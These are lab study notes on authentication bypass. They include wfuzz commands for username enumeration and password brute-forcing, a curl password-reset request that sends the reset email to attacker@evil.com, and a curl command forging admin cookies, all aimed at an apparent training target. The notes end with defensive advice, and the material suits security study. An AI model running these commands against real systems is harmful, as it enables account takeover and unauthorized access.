## Notes

### What it is

**Authentication Bypass** is not a single vulnerability but a collection of techniques used to circumvent the authentication mechanisms of a system. These techniques can lead to unauthorized access, account takeover, or even administrative control. Bypass methods often exploit:

- Weak or default credentials
- Logic flaws in authentication workflows
- Misconfigured session handling
- Insecure cookies

### Bruteforcing

If an application does not enforce strong password policies or account lockout mechanisms, attackers can easily perform bruteforce attacks using known username and password lists.

Use `wfuzz` or similar tools to identify valid usernames based on response differences:

```bash
wfuzz -c -z file, /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
--hs "Username already exists"  \
http://10.10.230.158/customers/signup | valid_usernames.txt
```

With the valid usernames, attempt common passwords:

```bash
wfuzz -c -z file, ./valid_usernames.txt \
-z file, /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \ 
-X POST -d "username=FUZZ&password=FUZ2Z" \
-H "Content-Type: application/x-www-form-urlencoded" \
--hs "Invalid Username/Password Combination" \
http://10.10.230.158/customers/signup | valid_logins.txt
```

### Logic flaws

Authentication workflows that rely heavily on frontend logic or parameter combinations are often vulnerable to abuse.

**Example:** Password reset functionality

If the system fetches the username based on the first request and only verifies the email in a second step, it might be possible to override the intended behavior by abusing how parameters are read.

```bash
# First GET parameter (email), then override with POST parameter
curl 'http://10.10.230.158/customers/reset?email=robert%40acmeitsupport.thm' \
-d 'username=robert&email=attacker@evil.com' \
-H 'Content-Type: application/x-www-form-urlencoded'
```

In PHP, using `$_REQUEST` will merge GET and POST variables. If the script fetches the email from `$_REQUEST['email']`, the POST-supplied email will override the GET-supplied one.

The password reset email is sent to the attacker's email instead of the legitimate user’s, enabling account takeover.

### Cookie tampering

Cookie tampering occurs when authentication or privilege verification relies solely on the value of client-side cookies — without server-side validation or protection.

If an application stores user roles or session states in cookies **without verifying them** on the server, an attacker can modify the cookies and elevate privileges.

```php
curl -H "Cookie: logged_in=true; admin=true" http://10.10.230.158/
```

If the server doesn’t validate whether the user is truly an admin (e.g., by checking a session token in a backend database), this cookie tampering can result in **privilege escalation**.

## Summary

**Authentication Bypass** encompasses a variety of techniques that allow attackers to circumvent login and access control mechanisms, potentially leading to unauthorized access or full account takeover.

These techniques include:

- **Brute-force attacks**, which exploit weak passwords and lack of rate-limiting or account lockout mechanisms.
- **Logic flaws** in workflows such as password reset processes, where inconsistent parameter handling or flawed validation logic can be manipulated to impersonate users.
- **Cookie tampering**, where insecure, client-controlled session or role cookies are modified to escalate privileges — often due to lack of server-side validation and missing security flags.

To defend against these threats, applications must enforce strong password policies, implement rate limiting, validate all input on the server side, and secure session cookies using proper flags and integrity checks.
